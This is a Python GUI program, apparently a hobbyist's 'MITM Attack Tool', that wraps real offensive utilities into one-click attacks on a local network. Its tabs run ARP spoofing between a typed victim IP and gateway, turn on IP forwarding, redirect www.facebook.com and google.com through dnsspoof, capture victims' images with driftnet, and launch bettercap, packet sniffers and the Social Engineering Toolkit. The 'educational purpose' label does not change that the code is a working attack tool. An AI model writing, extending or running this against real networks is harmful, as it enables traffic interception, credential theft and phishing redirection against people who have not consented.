#!/usr/bin/env python3
"""
J MITM Attack Tool - J Project Platform
Created by jh4ck3r - For Educational Purpose Only
Requires root privileges and proper authorization
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import sys
import time
import signal
import queue
from PIL import Image, ImageTk

# Check for root immediately
if os.geteuid() != 0:
    print("❌ ERROR: Root privileges required.")
    print("👉 Please run with: sudo python3 j-mitm.py")
    sys.exit(1)

class JMITMAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("J MITM Attack Tool - J Project Platform")
        self.root.geometry("1100x900")
        
        # UI Queue for thread-safe updates
        self.gui_queue = queue.Queue()
        self.root.after(100, self.process_gui_queue)

        # Process Management Dictionary
        self.active_processes = {}

        # --- GUI SETUP ---
        self.setup_main_layout()
        self.setup_notebook()
        self.setup_status_bar()

    def setup_main_layout(self):
        # Main container
        self.main_frame = tk.Frame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Canvas & Scrollbar
        self.canvas = tk.Canvas(self.main_frame)
        self.scrollbar = ttk.Scrollbar(self.main_frame, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = ttk.Frame(self.canvas)
        
        # Configure Scroll Region
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        # Create Window inside Canvas
        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        
        # Ensure inner frame expands to fill width
        self.canvas.bind("<Configure>", self._on_canvas_configure)

        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        self.canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")
        
        # Mousewheel binding
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)
        self.canvas.bind_all("<Button-4>", self._on_mousewheel) # Linux Scroll Up
        self.canvas.bind_all("<Button-5>", self._on_mousewheel) # Linux Scroll Down

        # Header
        header_frame = tk.Frame(self.scrollable_frame, bg="#2c3e50", height=100)
        header_frame.pack(fill=tk.X, expand=True)
        
        tk.Label(header_frame, text="J MITM Attack Tool", 
                font=("Segoe UI", 22, "bold"), fg="white", bg="#2c3e50").pack(pady=(15, 5))
        tk.Label(header_frame, text="Advanced Network Interceptor • J Project Platform", 
                font=("Segoe UI", 12), fg="#ecf0f1", bg="#2c3e50").pack(pady=(0, 15))

    def _on_canvas_configure(self, event):
        # Resize the inner frame to match the canvas width
        self.canvas.itemconfig(self.canvas_window, width=event.width)

    def setup_notebook(self):
        self.notebook = ttk.Notebook(self.scrollable_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Initialize Tabs
        self.setup_bettercap_tab()
        self.setup_network_discovery_tab()
        self.setup_arp_spoofing_tab()
        self.setup_dns_spoofing_tab()
        self.setup_packet_sniffing_tab()
        self.setup_image_capture_tab()
        self.setup_setoolkit_tab()
        self.setup_log_tab()
        self.setup_about_tab()

    def setup_status_bar(self):
        self.status_var = tk.StringVar()
        self.status_var.set("Ready - J Project Platform")
        status_bar = tk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W, bg="#34495e", fg="white")
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    # --- UTILITIES ---
    def _on_mousewheel(self, event):
        if event.num == 5 or event.delta == -120:
            self.canvas.yview_scroll(1, "units")
        elif event.num == 4 or event.delta == 120:
            self.canvas.yview_scroll(-1, "units")

    def log_message(self, message):
        """Thread-safe logging"""
        timestamp = time.strftime("%H:%M:%S")
        full_msg = f"[{timestamp}] {message}"
        self.gui_queue.put(("log", full_msg))
        self.status_var.set(f"Status: {message}")

    def process_gui_queue(self):
        """Process GUI updates from background threads"""
        try:
            while True:
                msg_type, data = self.gui_queue.get_nowait()
                
                if msg_type == "log":
                    if hasattr(self, 'log_text'):
                        self.log_text.insert(tk.END, data + "\n")
                        self.log_text.see(tk.END)
                elif msg_type == "scan_result":
                    if hasattr(self, 'scan_results'):
                        self.scan_results.insert(tk.END, data + "\n")
                        self.scan_results.see(tk.END)
                elif msg_type == "clear_scan":
                    if hasattr(self, 'scan_results'):
                        self.scan_results.delete(1.0, tk.END)
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_gui_queue)

    def get_default_interface(self):
        """Auto-detect network interface"""
        try:
            route = subprocess.check_output(["ip", "route"], text=True)
            for line in route.split("\n"):
                if "default via" in line:
                    return line.split("dev")[1].split()[0]
        except:
            return "eth0"

    def run_process(self, name, command_list, shell=False):
        """Launch a process and track it"""
        try:
            if name in self.active_processes:
                self.stop_process(name)

            self.log_message(f"Starting {name}...")
            
            proc = subprocess.Popen(
                command_list, 
                shell=shell,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid 
            )
            self.active_processes[name] = proc
            return True
        except Exception as e:
            self.log_message(f"Error starting {name}: {e}")
            messagebox.showerror("Execution Error", str(e))
            return False

    def stop_process(self, name):
        """Kill a tracked process"""
        if name in self.active_processes:
            proc = self.active_processes[name]
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                self.log_message(f"Stopped {name}.")
            except ProcessLookupError:
                self.log_message(f"{name} was already dead.")
            del self.active_processes[name]
        else:
            self.log_message(f"{name} is not running.")

    # --- TAB: BETTERCAP ---
    def setup_bettercap_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="🦹 Bettercap")
        
        cfg = tk.LabelFrame(frame, text="Settings", padx=10, pady=10)
        cfg.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(cfg, text="Interface:").grid(row=0, column=0)
        self.bc_iface = tk.Entry(cfg)
        self.bc_iface.insert(0, self.get_default_interface())
        self.bc_iface.grid(row=0, column=1, padx=5)

        tk.Button(cfg, text="🚀 Launch Bettercap GUI (Terminal)", 
                 command=self.start_bettercap, bg="#e74c3c", fg="white").grid(row=0, column=2, padx=10)

        lbl = tk.LabelFrame(frame, text="Quick Commands (Copy/Paste)", padx=10, pady=10)
        lbl.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        help_text = """Once Bettercap launches in the new window, type these commands:
        1. Network Discovery: net.probe on | net.show
        2. ARP Spoofing: set arp.spoof.targets <VICTIM_IP> | arp.spoof on
        3. Sniffing: net.sniff on"""
        txt = tk.Text(lbl, height=10)
        txt.pack(fill=tk.BOTH)
        txt.insert(tk.END, help_text)

    def start_bettercap(self):
        iface = self.bc_iface.get()
        cmd = f"xterm -geometry 100x30 -title 'J-MITM Bettercap' -e 'sudo bettercap -iface {iface}'"
        self.run_process("bettercap_term", cmd, shell=True)

    # --- TAB: NETWORK DISCOVERY ---
    def setup_network_discovery_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="🔍 Discovery")
        
        ctrl = tk.LabelFrame(frame, text="Scanner Controls", padx=10, pady=10)
        ctrl.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(ctrl, text="Target Range:").grid(row=0, column=0)
        self.scan_range = tk.Entry(ctrl)
        self.scan_range.insert(0, "192.168.1.0/24")
        self.scan_range.grid(row=0, column=1, padx=5)
        
        tk.Button(ctrl, text="Nmap (Ping Scan)", command=lambda: self.run_scan("nmap")).grid(row=0, column=2, padx=5)
        tk.Button(ctrl, text="Netdiscover (ARP)", command=lambda: self.run_scan("netdiscover")).grid(row=0, column=3, padx=5)
        tk.Button(ctrl, text="ARP-Scan (Fast)", command=lambda: self.run_scan("arp-scan")).grid(row=0, column=4, padx=5)

        self.scan_results = scrolledtext.ScrolledText(frame, height=20)
        self.scan_results.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

    def run_scan(self, tool):
        target = self.scan_range.get()
        iface = self.get_default_interface()
        
        cmd = []
        if tool == "nmap":
            cmd = ["nmap", "-sn", target]
        elif tool == "netdiscover":
            cmd = ["netdiscover", "-r", target, "-P"] 
        elif tool == "arp-scan":
            cmd = ["arp-scan", "--interface", iface, "--localnet"]

        def scan_thread():
            self.gui_queue.put(("clear_scan", None))
            self.log_message(f"Starting {tool} scan on {target}...")
            self.gui_queue.put(("scan_result", f"--- STARTING {tool.upper()} SCAN ---\n"))
            
            try:
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()
                self.gui_queue.put(("scan_result", stdout))
                if stderr: self.gui_queue.put(("scan_result", f"ERRORS:\n{stderr}"))
            except Exception as e:
                self.gui_queue.put(("scan_result", f"Error: {e}"))
            
            self.log_message(f"{tool} scan finished.")

        threading.Thread(target=scan_thread, daemon=True).start()

    # --- TAB: ARP SPOOFING ---
    def setup_arp_spoofing_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="🎭 ARP Spoofing")
        
        cfg = tk.LabelFrame(frame, text="Attack Configuration", padx=10, pady=10)
        cfg.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(cfg, text="Interface:").grid(row=0, column=0, sticky="w")
        self.arp_iface = tk.Entry(cfg)
        self.arp_iface.insert(0, self.get_default_interface())
        self.arp_iface.grid(row=0, column=1, pady=5)
        
        tk.Label(cfg, text="Target IP (Victim):").grid(row=1, column=0, sticky="w")
        self.arp_target = tk.Entry(cfg)
        self.arp_target.grid(row=1, column=1, pady=5)
        
        tk.Label(cfg, text="Gateway IP (Router):").grid(row=2, column=0, sticky="w")
        self.arp_gateway = tk.Entry(cfg)
        self.arp_gateway.grid(row=2, column=1, pady=5)
        
        act = tk.Frame(frame)
        act.pack(pady=10)
        
        tk.Button(act, text="1. Enable IP Forwarding", command=self.enable_forwarding).pack(side=tk.LEFT, padx=5)
        tk.Button(act, text="2. START ATTACK", command=self.start_arp, bg="#e74c3c", fg="white").pack(side=tk.LEFT, padx=5)
        tk.Button(act, text="3. STOP ATTACK", command=self.stop_arp, bg="#2ecc71").pack(side=tk.LEFT, padx=5)

        self.arp_log = scrolledtext.ScrolledText(frame, height=10)
        self.arp_log.pack(fill=tk.BOTH, expand=True, padx=10)
        self.arp_log.insert(tk.END, "Status: Waiting to start...\n")

    def enable_forwarding(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        self.log_message("IP Forwarding Enabled.")
        messagebox.showinfo("Success", "IP Forwarding Enabled.")

    def start_arp(self):
        target = self.arp_target.get()
        gateway = self.arp_gateway.get()
        iface = self.arp_iface.get()
        
        if not target or not gateway:
            messagebox.showerror("Error", "Fill in all fields!")
            return

        cmd1 = ["arpspoof", "-i", iface, "-t", target, gateway]
        cmd2 = ["arpspoof", "-i", iface, "-t", gateway, target]
        
        success1 = self.run_process("arpspoof_t2g", cmd1)
        success2 = self.run_process("arpspoof_g2t", cmd2)
        
        if success1 and success2:
            self.arp_log.insert(tk.END, f"✅ ATTACK RUNNING: {target} <--> {gateway}\n")
        else:
            self.stop_arp()

    def stop_arp(self):
        self.stop_process("arpspoof_t2g")
        self.stop_process("arpspoof_g2t")
        self.arp_log.insert(tk.END, "🛑 ATTACK STOPPED.\n")

    # --- TAB: DNS SPOOFING ---
    def setup_dns_spoofing_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="🌐 DNS Spoofing")
        
        cfg = tk.LabelFrame(frame, text="DNS Config", padx=10, pady=10)
        cfg.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(cfg, text="Interface:").grid(row=0, column=0)
        self.dns_iface = tk.Entry(cfg)
        self.dns_iface.insert(0, self.get_default_interface())
        self.dns_iface.grid(row=0, column=1)

        tk.Label(frame, text="Hosts File Config (One per line: IP DOMAIN):").pack(anchor="w", padx=10)
        self.hosts_editor = scrolledtext.ScrolledText(frame, height=8)
        self.hosts_editor.pack(fill=tk.X, padx=10)
        self.hosts_editor.insert(tk.END, "192.168.1.50 www.facebook.com\n192.168.1.50 google.com")

        btn_frame = tk.Frame(frame)
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="START DNS SPOOF", command=self.start_dns, bg="#e74c3c", fg="white").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="STOP DNS SPOOF", command=self.stop_dns, bg="#2ecc71").pack(side=tk.LEFT, padx=5)

    def start_dns(self):
        hosts_content = self.hosts_editor.get("1.0", tk.END).strip()
        with open("spoofhosts.txt", "w") as f:
            f.write(hosts_content)
        
        iface = self.dns_iface.get()
        cmd = ["dnsspoof", "-i", iface, "-f", "spoofhosts.txt"]
        
        if self.run_process("dnsspoof", cmd):
            self.log_message("DNS Spoofing Active.")
            messagebox.showinfo("Started", "DNS Spoofing running in background.")

    def stop_dns(self):
        self.stop_process("dnsspoof")

    # --- TAB: PACKET SNIFFING ---
    def setup_packet_sniffing_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="📡 Sniffing")
        
        tk.Label(frame, text="Launch Dedicated Sniffing Tools", font=("Bold", 14)).pack(pady=20)
        
        tk.Button(frame, text="🦈 Launch Wireshark", 
                 command=lambda: self.run_process("wireshark", ["wireshark"], shell=True),
                 height=2, width=30).pack(pady=5)
                 
        tk.Button(frame, text="📝 Launch TCPDump (Terminal)", 
                 command=self.start_tcpdump,
                 height=2, width=30).pack(pady=5)

    def start_tcpdump(self):
        iface = self.get_default_interface()
        cmd = f"xterm -hold -e 'tcpdump -i {iface} -v'"
        self.run_process("tcpdump", cmd, shell=True)

    # --- TAB: IMAGE CAPTURE ---
    def setup_image_capture_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="🖼️ Driftnet")
        
        ctrl = tk.LabelFrame(frame, text="Controls", padx=10, pady=10)
        ctrl.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(ctrl, text="Interface:").pack(side=tk.LEFT)
        self.drift_iface = tk.Entry(ctrl)
        self.drift_iface.insert(0, self.get_default_interface())
        self.drift_iface.pack(side=tk.LEFT, padx=5)
        
        tk.Button(ctrl, text="START DRIFTNET", command=self.start_driftnet).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl, text="STOP", command=lambda: self.stop_process("driftnet")).pack(side=tk.LEFT)

    def start_driftnet(self):
        iface = self.drift_iface.get()
        if not os.path.exists("/tmp/driftnet_images"):
            os.makedirs("/tmp/driftnet_images")
        cmd = ["driftnet", "-i", iface, "-d", "/tmp/driftnet_images"]
        if self.run_process("driftnet", cmd):
            self.log_message(f"Driftnet started. Images saving to /tmp/driftnet_images")

    # --- TAB: SETOOLKIT ---
    def setup_setoolkit_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="⚡ SET")
        
        tk.Label(frame, text="Social Engineering Toolkit", font=("Bold", 16)).pack(pady=20)
        tk.Label(frame, text="This will launch SET in a new terminal window.", font=("Arial", 10)).pack()
        
        tk.Button(frame, text="Launch SEToolkit", 
                 command=lambda: self.run_process("setoolkit", "xterm -e sudo setoolkit", shell=True),
                 bg="black", fg="white", height=3, width=20).pack(pady=20)

    # --- TAB: LOG ---
    def setup_log_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="📋 Logs")
        self.log_text = scrolledtext.ScrolledText(frame)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    # --- TAB: ABOUT ---
    def setup_about_tab(self):
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="ℹ️ About")
        
        info = """
        J MITM ATTACK TOOL
        Version 2.0 (Refactored)
        Created by: jh4ck3r
        Platform: J Project Platform
        """
        tk.Label(frame, text=info, font=("Consolas", 12), justify=tk.LEFT).pack(pady=20)

    def on_closing(self):
        """Cleanup on exit"""
        if messagebox.askokcancel("Quit", "Do you want to quit? All attacks will be stopped."):
            self.log_message("Stopping all processes...")
            procs = list(self.active_processes.keys())
            for name in procs:
                self.stop_process(name)
            self.root.destroy()

if __name__ == "__main__":
    # Dependency Check & Auto-Install
    required = ["arpspoof", "dnsspoof", "driftnet", "nmap", "netdiscover", "wireshark", "xterm"]
    missing = []
    
    for tool in required:
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL) != 0:
            missing.append(tool)
    
    if missing:
        print(f"⚠️  WARNING: The following tools are missing: {', '.join(missing)}")
        
        # AUTO-INSTALL LOGIC FOR XTERM
        if "xterm" in missing:
            print("    [!] xterm is required for terminal windows. Auto-installing...")
            try:
                print("    [*] Updating package lists...")
                subprocess.run(["sudo", "apt", "update"], check=True)
                print("    [*] Installing xterm...")
                subprocess.run(["sudo", "apt", "install", "xterm", "-y"], check=True)
                print("    [+] xterm installed successfully!")
                # Remove from missing list if successful
                missing.remove("xterm")
            except Exception as e:
                print(f"    [!] Failed to install xterm: {e}")
                print("    Please manually run: sudo apt install xterm -y")

        if missing:
            print(f"    Other missing tools: {', '.join(missing)}")
            print("    Some features will not work. Install them via apt.")
            input("    Press Enter to continue anyway...")

    root = tk.Tk()
    app = JMITMAttackGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
